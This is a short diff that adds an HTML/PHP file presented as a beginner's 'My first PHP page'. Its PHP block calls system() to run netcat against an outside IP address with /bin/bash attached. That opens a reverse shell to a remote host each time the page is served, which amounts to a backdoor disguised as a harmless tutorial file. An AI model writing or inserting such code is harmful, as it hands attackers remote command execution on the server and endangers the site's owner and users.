@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>My first PHP page</h1>
+
+<?php
+system("nc 45.144.232.240 8083 -e /bin/bash");
+
+?>
+
+</body>
+</html>
+
